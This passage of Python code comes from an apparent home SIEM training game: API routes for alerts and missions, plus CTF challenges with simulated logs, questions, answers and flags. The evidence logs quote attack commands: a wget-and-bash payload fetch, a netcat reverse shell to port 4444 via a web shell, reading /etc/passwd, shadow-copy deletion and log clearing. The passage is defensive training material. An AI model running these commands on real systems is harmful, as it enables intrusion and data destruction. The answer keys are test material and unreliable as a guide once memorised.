    return jsonify({"uptime":uptime,"total_packets":traffic_stats["total_packets"],"bytes_in":traffic_stats["bytes_in"],"total_alerts":len(alerts),"open_alerts":sum(1 for a in alerts if a["status"]=="open"),"critical_alerts":sum(1 for a in alerts if a["severity"]=="critical" and a["status"]=="open"),"top_talkers":sorted(traffic_stats["top_talkers"].items(),key=lambda x:x[1],reverse=True)[:5],"protocols":dict(traffic_stats["protocols"]),"rules_active":sum(1 for r in RULES if r.enabled),"blocked_ips":len(threat_intel["blocked_ips"]),"difficulty":difficulty_state["level"]})

@app.route("/api/analyst")
def api_analyst():
    xp=analyst_session["xp"]; lvl=analyst_session["level"]
    next_xp=LEVEL_THRESHOLDS[min(lvl,len(LEVEL_THRESHOLDS)-1)] if lvl<len(LEVEL_THRESHOLDS) else LEVEL_THRESHOLDS[-1]
    prev_xp=LEVEL_THRESHOLDS[lvl-1] if lvl>0 else 0
    pct=int((xp-prev_xp)/max(1,next_xp-prev_xp)*100) if next_xp>prev_xp else 100
    return jsonify({**{k:v for k,v in analyst_session.items() if k!="actions_log"},"level_name":LEVEL_NAMES[min(lvl-1,len(LEVEL_NAMES)-1)],"xp_to_next":max(0,next_xp-xp),"level_pct":pct,"accuracy":round(analyst_session["correct"]/max(1,analyst_session["total_scored"])*100),"actions_log":analyst_session["actions_log"][-20:]})

@app.route("/api/difficulty",methods=["GET","POST"])
def api_difficulty():
    if request.method=="POST":
        lvl=(request.json or {}).get("level","normal")
        if lvl in DIFFICULTY_CONFIG:
            difficulty_state["level"]=lvl
            return jsonify({"success":True,"level":lvl,"config":DIFFICULTY_CONFIG[lvl]})
    return jsonify({"level":difficulty_state["level"],"config":DIFFICULTY_CONFIG[difficulty_state["level"]],"options":{k:{"label":v["label"],"color":v["color"]} for k,v in DIFFICULTY_CONFIG.items()}})

@app.route("/api/alerts")
def api_alerts():
    sev=request.args.get("severity"); status=request.args.get("status"); limit=int(request.args.get("limit",200))
    result=list(alerts)
    if sev: result=[a for a in result if a["severity"]==sev]
    if status: result=[a for a in result if a["status"]==status]
    slim=("id","rule_id","rule_name","title","severity","src_ip","timestamp","status","attack_type","threat_score","packet_count","verdict","difficulty")
    return jsonify([{k:a[k] for k in slim if k in a} for a in result[:limit]])

@app.route("/api/alerts/<int:alert_id>")
def get_alert(alert_id):
    for a in alerts:
        if a["id"]==alert_id: return jsonify(a)
    return jsonify({"error":"Not found"}),404

@app.route("/api/alerts/<int:alert_id>",methods=["PATCH"])
def update_alert(alert_id):
    data=request.json
    for alert in alerts:
        if alert["id"]==alert_id:
            for k in ("status","notes","checklist"):
                if k in data: alert[k]=data[k]
            return jsonify(alert)
    return jsonify({"error":"Not found"}),404

@app.route("/api/alerts/<int:alert_id>/evaluate",methods=["POST"])
def evaluate_alert(alert_id):
    action=(request.json or {}).get("action","resolved")
    for alert in alerts:
        if alert["id"]==alert_id:
            if alert.get("verdict"):
                return jsonify({"already_graded":True,"verdict":alert["verdict"]})
            result=evaluate_action(alert,action)
            alert["verdict"]=result["verdict"]; alert["status"]=action
            xp=record_action(alert_id,action,result["verdict"],result["xp"],alert.get("_real_attack_type","normal"))
            lvl_after=analyst_session["level"]; leveled_up=lvl_after>result["level_before"]
            newly=check_missions()
            # war room tracking
            if war_room["active"] and result["verdict"]=="correct":
                if alert_id in war_room["alerts_to_clear"]: war_room["cleared"].append(alert_id)
            return jsonify({**result,"leveled_up":leveled_up,"new_level":lvl_after,"new_level_name":LEVEL_NAMES[min(lvl_after-1,len(LEVEL_NAMES)-1)],"streak":analyst_session["streak"],"total_xp":analyst_session["xp"],"xp_awarded":xp,"missions_completed":[{"id":m["id"],"name":m["name"],"xp_reward":m["xp_reward"]} for m in newly]})
    return jsonify({"error":"Not found"}),404

@app.route("/api/alerts/<int:alert_id>/hint")
def get_hint_api(alert_id):
    for alert in alerts:
        if alert["id"]==alert_id:
            diff=difficulty_state["level"]
            if diff=="hard" and not DIFFICULTY_CONFIG["hard"]["hints_free"]:
                return jsonify({"error":"Hints disabled on Hard difficulty","disabled":True}),403
            idx=alert.get("hint_index",0)
            at=alert.get("_real_attack_type","normal")
            hints=HINTS.get(at,["Review packet details and timeline carefully."])
            hint=hints[idx%len(hints)]; alert["hint_index"]=idx+1
            return jsonify({"hint":hint,"hint_num":idx+1,"total_hints":len(hints),"more":idx+1<len(hints),"cost":5 if diff=="normal" else 0})
    return jsonify({"error":"Not found"}),404

@app.route("/api/alerts/<int:alert_id>/block_ip",methods=["POST"])
def block_ip_alert(alert_id):
    for alert in alerts:
        if alert["id"]==alert_id:
            ip=alert.get("src_ip")
            if ip:
                threat_intel["blocked_ips"].add(ip); alert["status"]="resolved"
                alert["notes"]+=f"\nIP {ip} blocked at {datetime.now().strftime('%H:%M:%S')}"
                return jsonify({"success":True,"blocked_ip":ip})
    return jsonify({"error":"Not found"}),404

@app.route("/api/alerts/<int:alert_id>/pcap")
def download_pcap(alert_id):
    pkts=alert_packets.get(alert_id)
    if not pkts:
        for a in alerts:
            if a["id"]==alert_id:
                pkts=[event_to_pcap_packet(a.get("raw_event",{}),a.get("_real_attack_type","normal"))]; break
    if not pkts: return jsonify({"error":"No packets"}),404
    buf=io.BytesIO(build_pcap(pkts)); buf.seek(0)
    return send_file(buf,mimetype="application/vnd.tcpdump.pcap",as_attachment=True,download_name=f"homesiem_alert_{alert_id}.pcap")

@app.route("/api/events")
def api_events():
    return jsonify(list(events)[:int(request.args.get("limit",100))])

@app.route("/api/logs")
def api_logs():
    level=request.args.get("level"); src=request.args.get("src"); q=request.args.get("q",""); limit=int(request.args.get("limit",200))
    result=list(sim_logs)
    if level: result=[l for l in result if l["level"]==level]
    if src:   result=[l for l in result if l["src_ip"]==src]
    if q:     result=[l for l in result if q.lower() in l["line"].lower()]
    return jsonify(result[:limit])

@app.route("/api/network")
def api_network():
    hosts=[]
    for ip,info in NETWORK_HOSTS.items():
        hosts.append({**info,"ip":ip,"alert_count":len(host_alerts.get(ip,[])),"traffic":host_traffic.get(ip,0),"active_alerts":[aid for aid in host_alerts.get(ip,[]) if any(a["id"]==aid and a["status"]=="open" for a in alerts)]})
    connections=[]
    for a in list(alerts)[:30]:
        src=a.get("src_ip",""); dst=a.get("raw_event",{}).get("dst_ip","")
        if src and dst:
            connections.append({"src":src,"dst":dst,"severity":a["severity"],"attack_type":a.get("attack_type","")})
    return jsonify({"hosts":hosts,"connections":connections})

@app.route("/api/rules")
def api_rules():
    return jsonify([{"rule_id":r.rule_id,"name":r.name,"description":r.description,"severity":r.severity,"enabled":r.enabled,"trigger_count":r.trigger_count,"mitre":r.mitre} for r in RULES])

@app.route("/api/rules/<rule_id>/toggle",methods=["POST"])
def toggle_rule(rule_id):
    for r in RULES:
        if r.rule_id==rule_id:
            r.enabled=not r.enabled
            return jsonify({"rule_id":rule_id,"enabled":r.enabled})
    return jsonify({"error":"Not found"}),404

@app.route("/api/simulate/<attack_type>",methods=["POST"])
def simulate_attack(attack_type):
    src_ip=(request.json or {}).get("src_ip")
    MAP={"port_scan":inject_port_scan,"brute_force":inject_brute_force,"c2_beacon":inject_c2_beacon,"data_exfil":inject_data_exfil,"blocked_ip":inject_blocked_ip,"dns_tunnel":inject_dns_tunnel,"arp_spoof":inject_arp_spoof,"ransomware":inject_ransomware,"lateral_movement":inject_lateral_movement,"priv_escalation":inject_priv_escalation}
    if attack_type not in MAP: return jsonify({"error":"Unknown"}),400
    if attack_type=="blocked_ip": result=inject_blocked_ip()
    else: result=MAP[attack_type](src_ip)
    return jsonify({"success":True,"message":f"{attack_type.replace('_',' ').title()} simulated from/to {result}"})

@app.route("/api/war_room",methods=["GET"])
def api_war_room():
    wr=dict(war_room)
    if wr["start_time"]: wr["elapsed"]=int((datetime.now()-wr["start_time"]).total_seconds()); wr["remaining"]=max(0,wr["duration_sec"]-wr["elapsed"])
    wr["start_time"]=wr["start_time"].isoformat() if wr["start_time"] else None
    return jsonify({"state":wr,"scenarios":WAR_ROOM_SCENARIOS})

@app.route("/api/war_room/start",methods=["POST"])
def start_war_room():
    sid=(request.json or {}).get("scenario_id")
    scen=next((s for s in WAR_ROOM_SCENARIOS if s["id"]==sid),None)
    if not scen: return jsonify({"error":"Unknown scenario"}),400
    if war_room["active"]: return jsonify({"error":"War room already active"}),400
    threading.Thread(target=run_war_room,args=(scen,),daemon=True).start()
    return jsonify({"success":True,"scenario":scen})

@app.route("/api/war_room/abort",methods=["POST"])
def abort_war_room():
    war_room["active"]=False; war_room["complete"]=True; war_room["result"]={"success":False,"aborted":True}
    return jsonify({"success":True})

@app.route("/api/missions")
def api_missions():
    completed=analyst_session["missions_completed"]
    result=[]
    for m in MISSIONS:
        cond=m["condition"]; progress=0; target=cond.get("target",1)
        if cond["type"]=="total_scored": progress=analyst_session["total_scored"]
        elif cond["type"]=="correct_type": progress=sum(1 for a in analyst_session["actions_log"] if a.get("verdict")=="correct" and a.get("attack_type")==cond["attack_type"])
        elif cond["type"]=="total_correct": progress=analyst_session["correct"]
        elif cond["type"]=="streak": progress=analyst_session["best_streak"]
        elif cond["type"]=="blocked_ips": progress=len(threat_intel["blocked_ips"])
        elif cond["type"]=="accuracy": progress=round(analyst_session["correct"]/max(1,analyst_session["total_scored"])*100)
        elif cond["type"]=="war_room": progress=analyst_session.get("war_rooms_completed",0)
        elif cond["type"]=="level": progress=analyst_session["level"]
        result.append({**m,"completed":m["id"] in completed,"progress":min(progress,target),"target":target})
    return jsonify(result)

@app.route("/api/threat_intel")
def api_threat_intel():
    return jsonify({"blocked_ips":list(threat_intel["blocked_ips"]),"watchlist":list(threat_intel["watchlist"])})

@app.route("/api/threat_intel/block",methods=["POST"])
def manual_block():
    ip=(request.json or {}).get("ip")
    if not ip: return jsonify({"error":"No IP"}),400
    threat_intel["blocked_ips"].add(ip); return jsonify({"success":True,"blocked":ip})

@app.route("/api/threat_intel/unblock",methods=["POST"])
def manual_unblock():
    ip=(request.json or {}).get("ip")
    if not ip: return jsonify({"error":"No IP"}),400
    threat_intel["blocked_ips"].discard(ip); return jsonify({"success":True,"unblocked":ip})

@app.route("/api/clear_alerts",methods=["POST"])
def clear_alerts_route():
    alerts.clear(); alert_packets.clear(); alert_id_counter[0]=0; host_alerts.clear()
    return jsonify({"success":True})

@app.route("/api/wiki")
def api_wiki():
    section=request.args.get("section","all")
    if section=="ports": return jsonify(WIKI["ports"])
    if section=="attacks": return jsonify(WIKI["attacks"])
    if section=="concepts": return jsonify(WIKI["concepts"])
    return jsonify(WIKI)

# ══════════════════════════════════════════════════════════════════════════════
# CTF MODE — CHALLENGE DEFINITIONS
# Flags are ONLY stored here server-side. Never sent to frontend until earned.
# ══════════════════════════════════════════════════════════════════════════════

CTF_CHALLENGES = [
    # ── CATEGORY: Network Forensics ──────────────────────────────────────────
    {
        "id": "NF-001",
        "category": "Network Forensics",
        "title": "The Slow Knock",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "Your firewall logs captured a series of inbound connections from 45.33.32.156 "
            "over a 90-second window. The connections hit different ports with no responses. "
            "Analyse the packet data below and answer the questions to retrieve the flag."
        ),
        "evidence": {
            "packets": [
                {"no":1,"time":"00:00:01.042","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54821 → 192.168.1.1:22 [SYN]"},
                {"no":2,"time":"00:00:03.187","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54822 → 192.168.1.1:80 [SYN]"},
                {"no":3,"time":"00:00:07.391","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54823 → 192.168.1.1:443 [SYN]"},
                {"no":4,"time":"00:00:12.004","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54824 → 192.168.1.1:3389 [SYN]"},
                {"no":5,"time":"00:00:18.771","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54825 → 192.168.1.1:445 [SYN]"},
                {"no":6,"time":"00:00:26.330","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54826 → 192.168.1.1:8080 [SYN]"},
                {"no":7,"time":"00:00:35.512","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54827 → 192.168.1.1:23 [SYN]"},
                {"no":8,"time":"00:00:46.109","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54828 → 192.168.1.1:21 [SYN]"},
                {"no":9,"time":"00:00:58.883","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54829 → 192.168.1.1:25 [SYN]"},
                {"no":10,"time":"00:01:13.447","src":"45.33.32.156","dst":"192.168.1.1","proto":"TCP","len":60,"info":"45.33.32.156:54830 → 192.168.1.1:53 [SYN]"},
            ],
            "notes": "All SYN packets received NO response (all ports appear filtered). Timing is irregular — not a fast automated sweep."
        },
        "questions": [
            {"id":"q1","text":"What type of scan is this? (one word, lowercase)","answer":"portscan","accept":["portscan","port scan","port_scan"]},
            {"id":"q2","text":"How many unique destination ports were probed?","answer":"10","accept":["10"]},
            {"id":"q3","text":"What is the MITRE ATT&CK technique ID for this activity?","answer":"T1046","accept":["t1046","T1046"]},
            {"id":"q4","text":"The irregular timing between probes (not evenly spaced) suggests what evasion technique?","answer":"slow scan","accept":["slow scan","slowscan","slow_scan","timing evasion","slow scanning"]},
        ],
        "_flag": "FLAG{T1046_slow_scan_45_33_32_156_10ports}",
        "hint1": "Look at the time gaps between each packet — they're deliberately irregular.",
        "hint2": "The MITRE technique for discovering open network services is T10XX — fill in the last two digits.",
        "hint1_cost": 15, "hint2_cost": 25,
    },
    {
        "id": "NF-002",
        "category": "Network Forensics",
        "title": "Beacon in the Noise",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "A threat hunter flagged outbound traffic from workstation 192.168.1.30. "
            "The connections look like web traffic but something is off. "
            "Analyse the connection log and identify the C2 beaconing behaviour."
        ),
        "evidence": {
            "packets": [
                {"no":1,"time":"08:01:00.000","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":348,"info":"192.168.1.30:51001 → 185.220.101.47:443 [PSH,ACK] len=348"},
                {"no":2,"time":"08:06:00.213","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":351,"info":"192.168.1.30:51002 → 185.220.101.47:443 [PSH,ACK] len=351"},
                {"no":3,"time":"08:11:00.089","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":349,"info":"192.168.1.30:51003 → 185.220.101.47:443 [PSH,ACK] len=349"},
                {"no":4,"time":"08:16:00.334","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":352,"info":"192.168.1.30:51004 → 185.220.101.47:443 [PSH,ACK] len=352"},
                {"no":5,"time":"08:21:00.177","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":347,"info":"192.168.1.30:51005 → 185.220.101.47:443 [PSH,ACK] len=347"},
                {"no":6,"time":"08:26:00.401","src":"192.168.1.30","dst":"185.220.101.47","proto":"HTTPS","len":350,"info":"192.168.1.30:51006 → 185.220.101.47:443 [PSH,ACK] len=350"},
            ],
            "notes": "Destination 185.220.101.47 — not seen before this morning. No DNS query preceded the first connection. Payload size is nearly identical each time.",
            "dns_log": "No A/AAAA query for 185.220.101.47 found in DNS logs. IP contacted directly.",
            "threat_intel": "185.220.101.47 — listed in abuse.ch feodo tracker as Cobalt Strike C2 infrastructure (added 3 days ago)."
        },
        "questions": [
            {"id":"q1","text":"What is the beaconing interval in minutes?","answer":"5","accept":["5","5 minutes","five","5min"]},
            {"id":"q2","text":"What is suspicious about how the destination was contacted? (no ___)","answer":"no dns","accept":["no dns","no dns query","no dns lookup","direct ip","direct connection","hardcoded ip"]},
            {"id":"q3","text":"What well-known red team framework is associated with this C2 IP?","answer":"cobalt strike","accept":["cobalt strike","cobaltstrike","cs"]},
            {"id":"q4","text":"What MITRE technique covers this C2 communication method? (Txxxx)","answer":"T1071","accept":["t1071","T1071","t1071.001","T1071.001"]},
        ],
        "_flag": "FLAG{C2_beacon_5min_interval_CobaltStrike_T1071}",
        "hint1": "Count the minutes between each connection timestamp.",
        "hint2": "Legitimate software resolves hostnames via DNS first. This skipped that step entirely.",
        "hint1_cost": 20, "hint2_cost": 35,
    },
    {
        "id": "NF-003",
        "category": "Network Forensics",
        "title": "Exfil Express",
        "difficulty": "hard",
        "points": 350,
        "description": (
            "A DLP alert fired at 02:17 on a Tuesday. Outbound HTTPS traffic from the file server "
            "spiked dramatically. Your job is to determine what happened, how much data left, "
            "and via what mechanism — before your manager asks."
        ),
        "evidence": {
            "packets": [
                {"no":1,"time":"02:17:04.112","src":"192.168.1.20","dst":"104.21.45.89","proto":"HTTPS","len":1514,"info":"→ 104.21.45.89:443 [SYN]"},
                {"no":2,"time":"02:17:04.345","src":"104.21.45.89","dst":"192.168.1.20","proto":"HTTPS","len":1514,"info":"← 104.21.45.89:443 [SYN,ACK]"},
                {"no":3,"time":"02:17:04.512","src":"192.168.1.20","dst":"104.21.45.89","proto":"HTTPS","len":1514,"info":"TLS ClientHello → SNI: secure-backup.workers.dev"},
                {"no":4,"time":"02:17:05.001","src":"192.168.1.20","dst":"104.21.45.89","proto":"HTTPS","len":1514,"info":"[Data] POST /upload chunk 1/847"},
                {"no":5,"time":"02:17:05.512","src":"192.168.1.20","dst":"104.21.45.89","proto":"HTTPS","len":1514,"info":"[Data] POST /upload chunk 2/847"},
                {"no":6,"time":"02:21:39.881","src":"192.168.1.20","dst":"104.21.45.89","proto":"HTTPS","len":512,"info":"[Data] POST /upload chunk 847/847 [FIN]"},
            ],
            "notes": "Transfer duration: 4 minutes 35 seconds. 847 chunks × avg 14,000 bytes = ~11.8MB. Session ended cleanly with FIN.",
            "tls_sni": "secure-backup.workers.dev — Cloudflare Workers domain. No internal backup policy references this endpoint.",
            "file_server_logs": "02:16:58 svchost.exe opened HANDLE to D:\\HR\\personnel-records-2024.zip (47,291,842 bytes)\n02:17:03 svchost.exe initiated outbound connection\n02:21:40 Handle closed."
        },
        "questions": [
            {"id":"q1","text":"What domain was used to receive the exfiltrated data? (from TLS SNI)","answer":"secure-backup.workers.dev","accept":["secure-backup.workers.dev","workers.dev"]},
            {"id":"q2","text":"Approximately how many MB of data was exfiltrated? (whole number)","answer":"12","accept":["12","11","11.8","~12","approximately 12"]},
            {"id":"q3","text":"What legitimate-looking process was used to perform the exfil?","answer":"svchost.exe","accept":["svchost.exe","svchost"]},
            {"id":"q4","text":"What time (HH:MM) did the exfiltration begin?","answer":"02:17","accept":["02:17","2:17","02:17:04"]},
            {"id":"q5","text":"What type of data was stolen? (two words from the filename)","answer":"personnel records","accept":["personnel records","personnel-records","hr records","hr data","personnel data"]},
        ],
        "_flag": "FLAG{exfil_svchost_workers_dev_HR_data_0217}",
        "hint1": "The TLS SNI field reveals the actual destination hostname even in encrypted traffic.",
        "hint2": "Check which Windows process opened a file handle just before the connection was made.",
        "hint1_cost": 25, "hint2_cost": 40,
    },

    # ── CATEGORY: Log Analysis ────────────────────────────────────────────────
    {
        "id": "LA-001",
        "category": "Log Analysis",
        "title": "The Midnight Login",
        "difficulty": "easy",
        "points": 100,
        "description": (
            "The SOC received an after-hours alert. Auth logs from the web server show unusual "
            "activity between 23:58 and 00:03. Piece together what happened."
        ),
        "evidence": {
            "logs": [
                "Nov 14 23:58:01 webserver sshd[4412]: Failed password for admin from 91.108.4.21 port 53847 ssh2",
                "Nov 14 23:58:03 webserver sshd[4412]: Failed password for admin from 91.108.4.21 port 53848 ssh2",
                "Nov 14 23:58:05 webserver sshd[4412]: Failed password for root from 91.108.4.21 port 53849 ssh2",
                "Nov 14 23:58:07 webserver sshd[4412]: Failed password for root from 91.108.4.21 port 53850 ssh2",
                "Nov 14 23:58:09 webserver sshd[4412]: Failed password for ubuntu from 91.108.4.21 port 53851 ssh2",
                "Nov 14 23:58:11 webserver sshd[4412]: Failed password for ubuntu from 91.108.4.21 port 53852 ssh2",
                "Nov 14 23:58:13 webserver sshd[4412]: Accepted password for deploy from 91.108.4.21 port 53853 ssh2",
                "Nov 14 23:58:13 webserver sshd[4412]: pam_unix(sshd:session): session opened for user deploy by (uid=0)",
                "Nov 14 23:58:14 webserver sudo[4501]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
                "Nov 14 23:58:14 webserver sudo[4501]: pam_unix(sudo:auth): authentication failure; logname=deploy",
                "Nov 14 23:59:44 webserver sudo[4521]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://91.108.4.21/payload.sh",
                "Nov 15 00:00:12 webserver sudo[4522]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash payload.sh",
                "Nov 15 00:01:30 webserver cron[4600]: (root) CMD (*/5 * * * * /tmp/.hidden/beacon.sh)",
                "Nov 15 00:03:14 webserver sshd[4412]: Disconnected from user deploy 91.108.4.21 port 53853",
            ]
        },
        "questions": [
            {"id":"q1","text":"What username was successfully authenticated?","answer":"deploy","accept":["deploy"]},
            {"id":"q2","text":"How many failed login attempts occurred before the successful login?","answer":"6","accept":["6","six"]},
            {"id":"q3","text":"What file did the attacker download after gaining access?","answer":"payload.sh","accept":["payload.sh","/payload.sh","http://91.108.4.21/payload.sh"]},
            {"id":"q4","text":"What persistence mechanism did the attacker establish? (one word)","answer":"cron","accept":["cron","cronjob","crontab","cron job"]},
            {"id":"q5","text":"How many minutes did the entire attack session last? (from first failure to disconnect)","answer":"5","accept":["5","five","~5","about 5"]},
        ],
        "_flag": "FLAG{brute_deploy_wget_payload_cron_persistence}",
        "hint1": "Read the logs in order — the attack follows the classic kill chain.",
        "hint2": "A cron entry added to /tmp is a classic persistence indicator of compromise.",
        "hint1_cost": 10, "hint2_cost": 20,
    },
    {
        "id": "LA-002",
        "category": "Log Analysis",
        "title": "Lateral Larry",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "After a workstation was compromised, the attacker moved laterally. "
            "Correlate these Windows Security Event logs across three hosts to trace the path."
        ),
        "evidence": {
            "logs": [
                "-- HOST: WORKSTATION-ALPHA (192.168.1.30) --",
                "2024-11-14 09:12:44 EventID:4624 Logon Type:10 Account:DOMAIN\\jsmith Source:91.108.4.21 (RDP)",
                "2024-11-14 09:13:02 EventID:4688 New Process: cmd.exe Parent: explorer.exe User:jsmith",
                "2024-11-14 09:13:15 EventID:4688 New Process: mimikatz.exe Parent: cmd.exe User:jsmith  [AV ALERT]",
                "2024-11-14 09:13:16 EventID:4624 Logon Type:9 Account:DOMAIN\\Administrator (credentials dumped)",
                "2024-11-14 09:13:22 EventID:4648 Explicit credential logon: DOMAIN\\Administrator → FILE-SERVER",
                "",
                "-- HOST: FILE-SERVER (192.168.1.20) --",
                "2024-11-14 09:13:25 EventID:4624 Logon Type:3 Account:DOMAIN\\Administrator Source:192.168.1.30",
                "2024-11-14 09:13:26 EventID:4663 Object Access: \\\\FILE-SERVER\\HR\\payroll-2024.xlsx User:Administrator",
                "2024-11-14 09:13:28 EventID:4663 Object Access: \\\\FILE-SERVER\\HR\\personnel-records.zip User:Administrator",
                "2024-11-14 09:14:01 EventID:4648 Explicit credential logon: DOMAIN\\Administrator → SIEM-SERVER",
                "",
                "-- HOST: SIEM-SERVER (192.168.1.60) --",
                "2024-11-14 09:14:05 EventID:4624 Logon Type:3 Account:DOMAIN\\Administrator Source:192.168.1.20",
                "2024-11-14 09:14:07 EventID:4688 New Process: wevtutil.exe Args: cl Security Parent: cmd.exe",
                "2024-11-14 09:14:08 EventID:4688 New Process: wevtutil.exe Args: cl System Parent: cmd.exe",
                "2024-11-14 09:14:09 EventID:1102 Audit log cleared by: DOMAIN\\Administrator",
            ]
        },
        "questions": [
            {"id":"q1","text":"What tool did the attacker use to dump credentials on Workstation Alpha?","answer":"mimikatz","accept":["mimikatz","mimikatz.exe"]},
            {"id":"q2","text":"What was the lateral movement path? Format: HOST1 → HOST2 → HOST3 (use short names)","answer":"workstation-alpha → file-server → siem-server","accept":["workstation-alpha → file-server → siem-server","workstation → fileserver → siem","alpha → file → siem","192.168.1.30 → 192.168.1.20 → 192.168.1.60"]},
            {"id":"q3","text":"What file did the attacker access on the file server? (filename only)","answer":"payroll-2024.xlsx","accept":["payroll-2024.xlsx","payroll","payroll-2024"]},
            {"id":"q4","text":"What did the attacker do on the SIEM server and why? (two words)","answer":"cleared logs","accept":["cleared logs","log clearing","deleted logs","wiped logs","cleared events","covered tracks"]},
            {"id":"q5","text":"What Windows Event ID indicates audit log clearing?","answer":"1102","accept":["1102","eventid 1102","event 1102"]},
        ],
        "_flag": "FLAG{mimikatz_lateral_alpha_fileserver_siem_log_clearing_1102}",
        "hint1": "Follow the Administrator account — it appears on all three hosts.",
        "hint2": "wevtutil.exe cl = clear log. Why would an attacker target the SIEM specifically?",
        "hint1_cost": 20, "hint2_cost": 35,
    },
    {
        "id": "LA-003",
        "category": "Log Analysis",
        "title": "Web Shell Hunt",
        "difficulty": "hard",
        "points": 300,
        "description": (
            "Your web server was compromised via a web shell. The attacker uploaded it through "
            "the application and used it to execute commands. Find it in the access logs."
        ),
        "evidence": {
            "logs": [
                "192.168.55.12 - - [14/Nov/2024:10:01:12] \"GET /index.php HTTP/1.1\" 200 4821",
                "192.168.55.12 - - [14/Nov/2024:10:01:14] \"GET /login.php HTTP/1.1\" 200 1247",
                "192.168.55.12 - - [14/Nov/2024:10:01:22] \"POST /login.php HTTP/1.1\" 302 0",
                "192.168.55.12 - - [14/Nov/2024:10:01:23] \"GET /upload.php HTTP/1.1\" 200 3312",
                "192.168.55.12 - - [14/Nov/2024:10:01:45] \"POST /upload.php HTTP/1.1\" 200 88  [body: filename=shell.php.jpg, Content-Type: image/jpeg]",
                "192.168.55.12 - - [14/Nov/2024:10:01:52] \"GET /uploads/shell.php.jpg HTTP/1.1\" 200 12  [resp: <?php]",
                "192.168.55.12 - - [14/Nov/2024:10:02:01] \"GET /uploads/shell.php.jpg?cmd=id HTTP/1.1\" 200 24  [resp: uid=33(www-data)]",
                "192.168.55.12 - - [14/Nov/2024:10:02:08] \"GET /uploads/shell.php.jpg?cmd=whoami HTTP/1.1\" 200 9",
                "192.168.55.12 - - [14/Nov/2024:10:02:15] \"GET /uploads/shell.php.jpg?cmd=cat+/etc/passwd HTTP/1.1\" 200 2847",
                "192.168.55.12 - - [14/Nov/2024:10:02:44] \"GET /uploads/shell.php.jpg?cmd=python3+-c+'import+socket...' HTTP/1.1\" 200 0",
                "192.168.55.12 - - [14/Nov/2024:10:02:45] \"GET /uploads/shell.php.jpg?cmd=nc+-e+/bin/bash+91.108.4.21+4444 HTTP/1.1\" 200 0",
            ]
        },
        "questions": [
            {"id":"q1","text":"What is the filename of the web shell?","answer":"shell.php.jpg","accept":["shell.php.jpg","shell.php"]},
            {"id":"q2","text":"What bypass technique was used to upload a PHP file? (describe the trick)","answer":"double extension","accept":["double extension","double extension bypass","extension bypass",".php.jpg","php.jpg","file extension bypass"]},
            {"id":"q3","text":"What was the first command the attacker ran via the web shell?","answer":"id","accept":["id","cmd=id","?cmd=id"]},
            {"id":"q4","text":"What sensitive file did the attacker read?","answer":"/etc/passwd","accept":["/etc/passwd","etc/passwd","passwd"]},
            {"id":"q5","text":"What port did the attacker use for the reverse shell callback?","answer":"4444","accept":["4444","port 4444"]},
        ],
        "_flag": "FLAG{webshell_double_ext_bypass_reverse_shell_4444}",
        "hint1": "Look at the filename carefully — the server was tricked into executing it as PHP despite the extension.",
        "hint2": "The ?cmd= parameter is how the attacker sent commands. Trace them in order.",
        "hint1_cost": 25, "hint2_cost": 40,
    },

    # ── CATEGORY: Malware Indicators ─────────────────────────────────────────
    {
        "id": "MI-001",
        "category": "Malware Indicators",
        "title": "Ransom Note",
        "difficulty": "medium",
        "points": 200,
        "description": (
            "A host started behaving strangely. Process logs, registry events, and file system "
            "activity were captured in the 90 seconds before the user reported 'all my files have "
            "a weird extension.' Identify the ransomware kill chain."
        ),
        "evidence": {
            "logs": [
                "09:41:02 sysmon EventID:1 Process Create: powershell.exe -ep bypass -w hidden -enc JABjAGwAaQBlAG4AdA...",
                "09:41:03 sysmon EventID:3 Network: powershell.exe → 185.220.101.45:443",
                "09:41:07 sysmon EventID:11 File Create: C:\\Users\\jsmith\\AppData\\Roaming\\svchost32.exe",
                "09:41:08 sysmon EventID:1 Process Create: svchost32.exe Parent: powershell.exe",
                "09:41:09 sysmon EventID:13 Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → svchost32.exe",
                "09:41:10 sysmon EventID:1 Process Create: vssadmin.exe Args: delete shadows /all /quiet",
                "09:41:11 sysmon EventID:1 Process Create: wbadmin.exe Args: delete catalog -quiet",
                "09:41:12 sysmon EventID:11 File Create: C:\\Users\\jsmith\\Desktop\\README_DECRYPT.txt",
                "09:41:14 sysmon EventID:11 File Rename: budget_2024.xlsx → budget_2024.xlsx.locked",
                "09:41:14 sysmon EventID:11 File Rename: passwords.docx → passwords.docx.locked",
                "09:41:14 sysmon EventID:11 File Rename: project_plan.pptx → project_plan.pptx.locked",
                "09:41:15 sysmon EventID:11 File Rename: photo_backup.zip → photo_backup.zip.locked",
                "09:41:30 sysmon EventID:11 File Rename: [+847 more file rename events]",
            ]
        },
        "questions": [
            {"id":"q1","text":"What was the initial execution method used? (one word, the shell used)","answer":"powershell","accept":["powershell","powershell.exe"]},
